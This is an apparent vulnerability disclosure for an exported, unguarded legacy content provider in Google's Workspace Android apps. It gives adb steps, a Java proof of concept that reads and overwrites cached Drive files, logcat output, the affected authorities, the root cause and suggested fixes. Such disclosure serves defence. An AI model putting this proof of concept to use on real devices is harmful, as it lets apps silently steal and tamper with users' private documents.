# Google Workspace LegacyStorageBackendContentProvider — Systemic Unauthorized File Read & Write via Feature Flag Bypass

## Summary

The `LegacyStorageBackendContentProvider` in Google Drive (and Sheets, Docs, Slides) is exported with no permission guard. A feature flag that should enable a `checkCallingUriPermission()` check is disabled, so any zero-permission app can read and overwrite the victim's cached Drive files.

## Who is the attacker, who is the victim?

**Attacker:** Publishes a zero-permission app on Google Play (e.g., a calculator).

**Victim:** Any user who has Google Drive installed and has opened at least one file (creating a local cache).

The attacker's app silently reads the victim's cached Drive documents and can overwrite them with arbitrary content — no permissions, no user interaction, no visible indicator.

## Reproduction Steps

**Device:** Pixel 6a, Android 17 (CP31.260608.007), patch 2026-06-05

1. Open Google Drive and view any file (this caches it locally).

2. Install the PoC app (zero permissions, source below) and launch it:
```
adb install DrivePoC.apk
adb shell am start -n com.vrppoc/.MainActivity
adb logcat -s VRP_POC
```

3. The app queries the legacy provider directly — no `ACTION_OPEN_DOCUMENT`, no permission:
```java
Uri uri = Uri.parse("content://com.google.android.apps.docs.storage.legacy/"
    + "enc=encoded=<document_id>");

// READ — returns full file bytes
InputStream is = getContentResolver().openInputStream(uri);

// WRITE — overwrites the cached file
OutputStream os = getContentResolver().openOutputStream(uri, "w");
os.write("ATTACKER_PAYLOAD".getBytes());
os.close();
```

4. Logcat output confirms both read and write from the unprivileged app:
```
[BLOCKED] SAF provider: requires android.permission.MANAGE_DOCUMENTS
[BYPASS]  Legacy provider: Feature flag DISABLED — no permission check
[STOLEN-DATA] Read 39289 bytes — COMPLETE FILE (header: 504b0304 = valid xlsx)
[WRITE-OK] openOutputStream("w") succeeded — no SecurityException
[VERIFY]  Read-back confirms attacker payload persisted
```

## Security Impact

**Confidentiality:** A zero-permission app reads the victim's cached Google Drive files — spreadsheets, PDFs, presentations — in full. In testing, 1 MB across 5 files was exfiltrated in under 200ms.

**Integrity:** The same app overwrites cached files with attacker content. The file keeps its original name and MIME type, so the corruption is invisible until the victim opens the file.

## Root Cause

The provider is declared `exported=true` with no `android:permission`:

```xml
<provider
    android:name="...LegacyStorageBackendContentProvider"
    android:exported="true"
    android:authorities="com.google.android.apps.docs.storage.legacy"/>
    <!-- NO android:permission — compare with the SAF provider which requires MANAGE_DOCUMENTS -->
```

The runtime check exists but is gated behind a feature flag that evaluates to `false`:

```java
// openFile() in LegacyStorageBackendContentProvider
if (featureFlag.isEnabled()        // returns false — check never runs
    && uri != null
    && checkCallingUriPermission(uri, 1) != 0) {
    throw new SecurityException();
}
```

`query()` has no security check at all — not even behind the flag.

The same class is shipped in all four Workspace apps (Drive, Sheets, Docs, Slides) with identical misconfiguration.

## Affected Apps

| App | Authority |
|-----|-----------|
| Google Drive | `com.google.android.apps.docs.storage.legacy` |
| Google Sheets | `com.google.android.apps.docs.editors.trix.storage.legacy` |
| Google Docs | `com.google.android.apps.docs.editors.kix.storage.legacy` |
| Google Slides | `com.google.android.apps.docs.editors.punch.storage.legacy` |

## Suggested Fix

1. Add `android:readPermission` / `android:writePermission` to the provider declaration.
2. Make the `checkCallingUriPermission()` check unconditional (remove the feature flag gate).
3. Add a permission check to `query()` (currently has none).
